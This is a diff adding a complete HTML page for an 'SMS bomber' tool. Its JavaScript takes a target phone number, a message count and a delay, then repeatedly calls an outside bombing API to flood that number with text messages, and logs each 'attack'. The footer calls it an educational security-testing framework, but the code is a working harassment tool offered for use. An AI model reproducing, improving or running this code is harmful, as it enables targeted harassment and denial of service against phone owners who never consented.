@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title> AHMII SMS BOMBER | FIXED EDITION 2026 </title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(ellipse at 30% 20%, #0a0a0f, #020208);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Animated Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .particle {
+            position: absolute;
+            background: rgba(0, 255, 200, 0.4);
+            border-radius: 50%;
+            opacity: 0;
+            animation: floatParticle 8s infinite;
+        }
+        @keyframes floatParticle {
+            0% { opacity: 0; transform: translateY(0) scale(0.3); }
+            20% { opacity: 0.6; }
+            80% { opacity: 0.3; }
+            100% { opacity: 0; transform: translateY(-100px) scale(1); }
+        }
+
+        /* Glow Background */
+        .glow-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 40%, rgba(0, 200, 150, 0.05) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, rgba(100, 100, 255, 0.04) 0%, transparent 50%);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 560px;
+            margin: 0 auto;
+            padding: 24px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff, #00ffcc, #00ff88, #fff);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: shimmer 3s linear infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+        .logo i {
+            background: linear-gradient(135deg, #00ffcc, #00ff88);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-right: 8px;
+        }
+        .badge {
+            display: inline-flex;
+            gap: 12px;
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(12px);
+            padding: 8px 24px;
+            border-radius: 60px;
+            margin-top: 16px;
+            border: 0.5px solid rgba(0,255,200,0.2);
+        }
+        .badge span {
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: rgba(255,255,255,0.7);
+        }
+        .badge .year {
+            color: #00ffcc;
+            font-weight: 700;
+        }
+
+        /* Premium Card */
+        .premium-card {
+            background: rgba(8, 8, 16, 0.7);
+            backdrop-filter: blur(24px);
+            border-radius: 48px;
+            padding: 38px 32px;
+            border: 0.5px solid rgba(0, 255, 200, 0.25);
+            transition: all 0.3s ease;
+        }
+        .premium-card:hover {
+            border-color: rgba(0, 255, 200, 0.5);
+            box-shadow: 0 20px 40px -15px rgba(0,255,200,0.15);
+        }
+
+        /* Input Group */
+        .input-group {
+            margin-bottom: 24px;
+        }
+        .input-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: rgba(255,255,255,0.8);
+        }
+        .input-label i {
+            color: #00ffcc;
+        }
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(0,255,200,0.2);
+            border-radius: 32px;
+            color: white;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #00ffcc;
+            box-shadow: 0 0 15px rgba(0,255,200,0.1);
+            background: rgba(0,0,0,0.7);
+        }
+        .input-field::placeholder {
+            color: rgba(255,255,255,0.2);
+        }
+
+        /* Format Row */
+        .format-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        .format-chip {
+            background: rgba(0,255,200,0.06);
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: rgba(0,255,200,0.85);
+            border: 0.5px solid rgba(0,255,200,0.2);
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .format-chip:hover {
+            background: rgba(0,255,200,0.15);
+            border-color: #00ffcc;
+        }
+
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            gap: 16px;
+            margin-top: 32px;
+        }
+        .btn {
+            flex: 1;
+            padding: 15px 18px;
+            border: none;
+            border-radius: 100px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: 'Inter', sans-serif;
+        }
+        .btn-primary {
+            background: linear-gradient(105deg, #00ffaa, #00cc88);
+            color: #020208;
+            box-shadow: 0 4px 15px rgba(0,255,170,0.25);
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 22px rgba(0,255,170,0.4);
+        }
+        .btn-danger {
+            background: rgba(255,70,90,0.12);
+            border: 0.5px solid rgba(255,70,90,0.4);
+            color: #ff6b7a;
+        }
+        .btn-danger:hover:not(:disabled) {
+            background: rgba(255,70,90,0.22);
+            border-color: #ff6b7a;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Progress */
+        .progress-area {
+            margin-top: 32px;
+            display: none;
+        }
+        .progress-bar-wrap {
+            background: rgba(255,255,255,0.05);
+            border-radius: 60px;
+            height: 6px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: linear-gradient(90deg, #00ffcc, #00ff88);
+            width: 0%;
+            height: 100%;
+            border-radius: 60px;
+            transition: width 0.2s ease;
+        }
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 14px;
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.55);
+        }
+        .stat-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .stat-badge i.fa-check-circle { color: #00ff88; }
+        .stat-badge i.fa-times-circle { color: #ff6b7a; }
+
+        /* Live Log */
+        .live-log {
+            margin-top: 24px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 28px;
+            padding: 14px 16px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 0.75rem;
+            font-family: 'Inter', monospace;
+            border: 0.5px solid rgba(255,255,255,0.05);
+        }
+        .log-entry {
+            padding: 6px 0;
+            border-bottom: 0.5px solid rgba(255,255,255,0.03);
+            color: rgba(255,255,255,0.7);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .log-entry.success { color: #00ffaa; }
+        .log-entry.error { color: #ff8a9a; }
+        .log-entry i { width: 18px; }
+
+        /* Toast */
+        .result-toast {
+            margin-top: 24px;
+            padding: 14px 20px;
+            border-radius: 28px;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            animation: fadeSlide 0.3s ease;
+        }
+        .result-toast.show {
+            display: flex;
+        }
+        .result-toast.success {
+            background: rgba(0,255,170,0.12);
+            border: 0.5px solid rgba(0,255,170,0.4);
+        }
+        .result-toast.error {
+            background: rgba(255,70,90,0.08);
+            border: 0.5px solid rgba(255,70,90,0.3);
+        }
+        .result-toast i { font-size: 1.2rem; }
+        .result-toast.success i { color: #00ffaa; }
+        .result-toast.error i { color: #ff8a9a; }
+
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.25);
+            border-top: 0.5px solid rgba(255,255,255,0.05);
+            padding-top: 24px;
+        }
+        .footer strong {
+            color: #00ffcc;
+        }
+
+        @media (max-width: 520px) {
+            .container { padding: 16px; }
+            .premium-card { padding: 28px 22px; }
+            .logo { font-size: 1.8rem; }
+            .btn-group { flex-direction: column; }
+        }
+
+        @keyframes softPulse {
+            0% { border-color: rgba(0,255,200,0.2); }
+            50% { border-color: rgba(0,255,200,0.6); box-shadow: 0 0 0 4px rgba(0,255,200,0.05); }
+            100% { border-color: rgba(0,255,200,0.2); }
+        }
+        .attacking {
+            animation: softPulse 1.2s infinite;
+        }
+    </style>
+</head>
+<body>
+
+<div class="particles" id="particlesContainer"></div>
+<div class="glow-bg"></div>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <i class="fas fa-skull-crossbones"></i> AHMII BOMBER
+        </div>
+        <div class="badge">
+            <span><i class="fas fa-shield-alt"></i> ENTERPRISE</span>
+            <span class="year"> 2026 </span>
+            <span><i class="fas fa-crown"></i> PREMIUM</span>
+        </div>
+    </div>
+
+    <div class="premium-card">
+        <div class="input-group">
+            <div class="input-label"><i class="fas fa-mobile-alt"></i> TARGET NUMBER</div>
+            <input type="text" id="targetNumber" class="input-field" placeholder="923021234865 or 03021234865" value="923021234865">
+            <div class="format-row">
+                <div class="format-chip" data-format="92"> 92XXXXXXXXXX</div>
+                <div class="format-chip" data-format="03"> 03XXXXXXXXX</div>
+                <div class="format-chip" data-format="clear"> Clear</div>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <div class="input-label"><i class="fas fa-bolt"></i> QUANTITY</div>
+            <input type="number" id="msgAmount" class="input-field" value="5" min="1" max="100">
+        </div>
+
+        <div class="input-group">
+            <div class="input-label"><i class="fas fa-hourglass-half"></i> DELAY (ms)</div>
+            <input type="number" id="msgDelay" class="input-field" value="800" min="300" max="3000">
+        </div>
+
+        <div class="btn-group">
+            <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> LAUNCH</button>
+            <button id="abortBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> ABORT</button>
+        </div>
+
+        <div class="progress-area" id="progressArea">
+            <div class="progress-bar-wrap"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="progress-stats">
+                <span class="stat-badge"><i class="fas fa-envelope"></i> <span id="sentCount">0</span>/<span id="totalCount">0</span></span>
+                <span class="stat-badge"><i class="fas fa-check-circle"></i> <span id="successCount">0</span></span>
+                <span class="stat-badge"><i class="fas fa-times-circle"></i> <span id="failCount">0</span></span>
+            </div>
+        </div>
+
+        <div class="live-log" id="liveLog">
+            <div class="log-entry"><i class="fas fa-info-circle"></i> System ready. Enter target number.</div>
+        </div>
+
+        <div id="resultToast" class="result-toast"></div>
+    </div>
+
+    <div class="footer">
+        <p> <strong>AHMII</strong> • CYBER TESTING FRAMEWORK • EDUCATIONAL USE </p>
+        <p>© 2026 — Premium SMS Security Testing</p>
+    </div>
+</div>
+
+<script>
+    // DOM Elements
+    const startBtn = document.getElementById('startBtn');
+    const abortBtn = document.getElementById('abortBtn');
+    const numberInput = document.getElementById('targetNumber');
+    const amountInput = document.getElementById('msgAmount');
+    const delayInput = document.getElementById('msgDelay');
+    const progressArea = document.getElementById('progressArea');
+    const progressFill = document.getElementById('progressFill');
+    const sentSpan = document.getElementById('sentCount');
+    const totalSpan = document.getElementById('totalCount');
+    const successSpan = document.getElementById('successCount');
+    const failSpan = document.getElementById('failCount');
+    const liveLogDiv = document.getElementById('liveLog');
+    const resultToast = document.getElementById('resultToast');
+
+    // State
+    let isAttacking = false;
+    let stopRequested = false;
+    let sent = 0, successTotal = 0, failTotal = 0;
+    let targetTotal = 0;
+    let activeTimers = [];
+
+    const API_URL = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
+
+    // Helper Functions
+    function showToast(message, type = 'success') {
+        resultToast.className = `result-toast ${type} show`;
+        resultToast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-triangle'}"></i><span>${message}</span>`;
+        setTimeout(() => {
+            resultToast.classList.remove('show');
+        }, 4000);
+    }
+
+    function addLog(message, isSuccess = true) {
+        const logEntry = document.createElement('div');
+        logEntry.className = `log-entry ${isSuccess ? 'success' : 'error'}`;
+        logEntry.innerHTML = `<i class="fas ${isSuccess ? 'fa-check' : 'fa-times'}"></i> ${message}`;
+        liveLogDiv.appendChild(logEntry);
+        logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        while (liveLogDiv.children.length > 45) liveLogDiv.removeChild(liveLogDiv.firstChild);
+    }
+
+    function clearLogs() {
+        liveLogDiv.innerHTML = '<div class="log-entry"><i class="fas fa-info-circle"></i> Attack launched — tracking messages...</div>';
+    }
+
+    function convertToInternational(num) {
+        let clean = num.replace(/\D/g, '');
+        if (clean.startsWith('03') && clean.length === 11) {
+            return '92' + clean.slice(1);
+        }
+        if (clean.startsWith('3') && clean.length === 10) {
+            return '92' + clean;
+        }
+        if (clean.startsWith('92') && clean.length === 12) {
+            return clean;
+        }
+        if (clean.startsWith('92') && clean.length > 12) return clean.slice(0, 12);
+        return clean;
+    }
+
+    function isValidNumber(num) {
+        return /^92[0-9]{10}$/.test(num);
+    }
+
+    async function sendMessage(number, index) {
+        const url = API_URL + number;
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 15000);
+            
+            const response = await fetch(url, {
+                method: 'GET',
+                signal: controller.signal,
+                headers: {
+                    'Accept': 'application/json',
+                    'Cache-Control': 'no-cache'
+                }
+            });
+            
+            clearTimeout(timeoutId);
+            const text = await response.text();
+            
+            // Check for success indicators
+            const isSuccess = response.ok || 
+                             text.toLowerCase().includes('success') || 
+                             text.includes('sent') ||
+                             text.includes('delivered');
+            
+            return { success: isSuccess, response: text };
+        } catch (err) {
+            console.warn(`Message ${index} error:`, err);
+            return { success: false, error: err.message };
+        }
+    }
+
+    function updateUI() {
+        const percent = targetTotal ? (sent / targetTotal) * 100 : 0;
+        progressFill.style.width = `${percent}%`;
+        sentSpan.innerText = sent;
+        totalSpan.innerText = targetTotal;
+        successSpan.innerText = successTotal;
+        failSpan.innerText = failTotal;
+    }
+
+    function resetUI() {
+        isAttacking = false;
+        stopRequested = false;
+        startBtn.disabled = false;
+        abortBtn.disabled = true;
+        numberInput.disabled = false;
+        amountInput.disabled = false;
+        delayInput.disabled = false;
+        document.querySelector('.premium-card')?.classList.remove('attacking');
+        // Clear any pending timers
+        activeTimers.forEach(timer => clearTimeout(timer));
+        activeTimers = [];
+    }
+
+    async function startAttack() {
+        if (isAttacking) return;
+
+        let rawNumber = numberInput.value.trim();
+        let amount = parseInt(amountInput.value);
+        let delay = parseInt(delayInput.value);
+
+        if (!rawNumber) {
+            showToast('Please enter a phone number', 'error');
+            return;
+        }
+
+        const international = convertToInternational(rawNumber);
+        if (!isValidNumber(international)) {
+            showToast('Invalid number! Use 92XXXXXXXXXX or 03XXXXXXXXX', 'error');
+            return;
+        }
+
+        if (isNaN(amount) || amount < 1) amount = 1;
+        if (amount > 100) amount = 100;
+        if (isNaN(delay)) delay = 800;
+        if (delay < 300) delay = 300;
+        if (delay > 3000) delay = 3000;
+
+        numberInput.value = international;
+        
+        // Reset state
+        isAttacking = true;
+        stopRequested = false;
+        sent = 0;
+        successTotal = 0;
+        failTotal = 0;
+        targetTotal = amount;
+        
+        startBtn.disabled = true;
+        abortBtn.disabled = false;
+        numberInput.disabled = true;
+        amountInput.disabled = true;
+        delayInput.disabled = true;
+        progressArea.style.display = 'block';
+        clearLogs();
+        updateUI();
+        
+        document.querySelector('.premium-card')?.classList.add('attacking');
+        showToast(` Attack started on ${international}`, 'success');
+        addLog(` LAUNCH — Target: ${international} | Total: ${amount} SMS`, true);
+
+        for (let i = 1; i <= amount; i++) {
+            if (stopRequested || !isAttacking) {
+                addLog(` Attack stopped by user`, false);
+                showToast('Attack aborted', 'error');
+                break;
+            }
+
+            const result = await sendMessage(international, i);
+            
+            if (result.success) {
+                successTotal++;
+                addLog(` Msg ${i}  DELIVERED to ${international}`, true);
+            } else {
+                failTotal++;
+                addLog(` Msg ${i}  FAILED (${result.error || 'API error'})`, false);
+            }
+            
+            sent++;
+            updateUI();
+            
+            if (i < amount && delay > 0 && !stopRequested && isAttacking) {
+                await new Promise(resolve => {
+                    const timer = setTimeout(resolve, delay);
+                    activeTimers.push(timer);
+                });
+            }
+        }
+
+        const successRate = sent ? Math.round((successTotal / sent) * 100) : 0;
+
+        if (!stopRequested && isAttacking) {
+            if (successTotal > 0) {
+                showToast(` Complete! ${successTotal}/${sent} messages delivered (${successRate}%)`, 'success');
+                addLog(` FINISHED — Delivered: ${successTotal}/${sent} | Success rate: ${successRate}%`, true);
+            } else {
+                showToast(` Attack finished — 0 messages delivered. Target may be invalid.`, 'error');
+                addLog(` ZERO delivery — target number may be invalid or API issue`, false);
+            }
+        }
+
+        resetUI();
+        setTimeout(() => {
+            if (!isAttacking) progressArea.style.display = 'none';
+        }, 1000);
+    }
+
+    function abortAttack() {
+        if (!isAttacking) return;
+        stopRequested = true;
+        isAttacking = false;
+        addLog(` ABORT signal sent — stopping remaining messages`, false);
+        showToast('Aborting attack...', 'error');
+        resetUI();
+        progressArea.style.display = 'none';
+        document.querySelector('.premium-card')?.classList.remove('attacking');
+    }
+
+    // Event Listeners
+    document.querySelectorAll('.format-chip').forEach(chip => {
+        chip.addEventListener('click', () => {
+            const format = chip.getAttribute('data-format');
+            if (format === '92') numberInput.value = '92';
+            else if (format === '03') numberInput.value = '03';
+            else if (format === 'clear') numberInput.value = '';
+            numberInput.focus();
+        });
+    });
+
+    numberInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        if (val.startsWith('92') && val.length > 12) val = val.slice(0, 12);
+        if (val.startsWith('03') && val.length > 11) val = val.slice(0, 11);
+        this.value = val;
+    });
+
+    amountInput.addEventListener('change', () => {
+        let v = parseInt(amountInput.value);
+        if (v > 100) amountInput.value = 100;
+        if (v < 1) amountInput.value = 1;
+    });
+    
+    delayInput.addEventListener('change', () => {
+        let d = parseInt(delayInput.value);
+        if (d > 3000) delayInput.value = 3000;
+        if (d < 300) delayInput.value = 300;
+    });
+
+    startBtn.addEventListener('click', startAttack);
+    abortBtn.addEventListener('click', abortAttack);
+
+    // Particles Background
+    for (let i = 0; i < 80; i++) {
+        const particle = document.createElement('div');
+        particle.classList.add('particle');
+        const size = Math.random() * 3 + 1;
+        particle.style.width = size + 'px';
+        particle.style.height = size + 'px';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particle.style.animationDuration = 5 + Math.random() * 7 + 's';
+        document.getElementById('particlesContainer')?.appendChild(particle);
+    }
+
+    console.log('%c AHMII SMS BOMBER 2026 | Fixed Edition ', 'color: #00ffcc; font-size: 14px; font-weight: bold;');
+    console.log('%cNow working with proper API handling', 'color: #aaa; font-size: 12px;');
+</script>
+</body>
+</html>
